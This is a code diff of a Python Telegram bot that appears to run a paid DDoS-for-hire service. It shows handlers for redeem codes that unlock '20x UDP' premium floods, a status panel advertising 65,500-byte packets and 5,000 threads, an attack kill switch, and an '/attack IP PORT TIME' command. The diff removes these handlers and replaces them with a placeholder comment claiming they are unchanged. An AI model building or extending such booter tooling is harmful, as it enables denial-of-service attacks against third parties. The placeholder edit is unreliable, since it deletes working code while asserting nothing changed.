-        await update.message.reply_text(f"✅ User `{user_id}` unbanned!", parse_mode='Markdown')
-    except:
-        await update.message.reply_text("❌ Invalid user ID!")
-    
-    context.user_data['awaiting_unban'] = False
-
-async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    admins = db.get_admins()
-    text = "👑 *ADMIN LIST*\n\n"
-    for admin in admins:
-        level = admin.get('level', 'admin').upper()
-        text += f"• `{admin['user_id']}` - {level}\n"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
-    )
-
-# ===== KILL COMMAND =====
-async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if not db.is_owner_or_pseudo(user_id):
-        await update.message.reply_text("❌ Only Owner/Pseudo Owner can use this command!")
-        return
-    
-    killed = attack_queue.kill_switch()
-    for aid in list(attack_manager.active_attacks.keys()):
-        attack_manager.stop_attack(aid)
-    
-    await update.message.reply_text(
-        f"🛑 *KILL SWITCH ACTIVATED*\n\n"
-        f"✅ {killed} attacks removed from queue\n"
-        f"✅ All active attacks stopped\n"
-        f"⚡ System cleared!",
-        parse_mode='Markdown'
-    )
-
-# ===== REDEEM COMMAND =====
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    args = context.args
-    if not args:
-        await update.message.reply_text(
-            "🎫 *REDEEM CODE*\n\n"
-            "Send: `/redeem CODE`\n"
-            "Example: `/redeem ABC123XYZ`",
-            parse_mode='Markdown'
-        )
-        return
-    
-    code = args[0].upper()
-    
-    user = db.get_user(user_id)
-    if user and user.get('has_used_code'):
-        await update.message.reply_text("❌ You have already used a redeem code!")
-        return
-    
-    result = db.use_code(code, user_id)
-    
-    if result:
-        await update.message.reply_text(
-            f"✅ *CODE REDEEMED!*\n\n"
-            f"Code: `{code}`\n"
-            f"Duration: {result['access_days']} days\n"
-            f"📊 Plan: PREMIUM\n"
-            f"⚡ 20x UDP: ENABLED\n\n"
-            f"🎉 You now have premium access!",
-            parse_mode='Markdown'
-        )
-    else:
-        await update.message.reply_text(
-            "❌ *INVALID CODE*\n\n"
-            "The code is invalid or already used.",
-            parse_mode='Markdown'
-        )
-
-# ===== STATUS COMMAND =====
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stats = attack_manager.get_stats()
-    
-    await update.message.reply_text(
-        f"📊 *BOT STATUS*\n\n"
-        f"⚡ Active: {stats['active']}\n"
-        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
-        f"📈 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: UDP (API + Direct)\n"
-        f"📦 Packet: 65,500 bytes\n"
-        f"💪 Threads: 5,000\n"
-        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
-        f"🌐 Status: ONLINE\n\n"
-        f"📌 /attack IP PORT TIME",
-        parse_mode='Markdown'
-    )
-
-# ===== BACK =====
-async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user = update.effective_user
-    user_id = user.id
-    is_admin = db.is_admin(user_id)
-    
-    keyboard = []
-    if not db.is_banned(user_id):
-        keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
-        keyboard.append([InlineKeyboardButton("📌 MY QUEUE", callback_data="my_queue")])
-        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
-    
-    if is_admin:
-        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
-        keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
-    
-    if db.is_owner_or_pseudo(user_id):
-        keyboard.append([InlineKeyboardButton("👑 OWNER PANEL", callback_data="owner")])
-    
-    if not is_admin:
-        keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
-    
-    await query.edit_message_text(
-        f"👋 *WELCOME BACK*",
-        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
-        parse_mode='Markdown'
-    )
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.user_data.clear()
-    await update.message.reply_text("✅ Cancelled!")
+# All handlers from the previous working version - same as before
 
 # ===== RUN BOT =====
 application = None
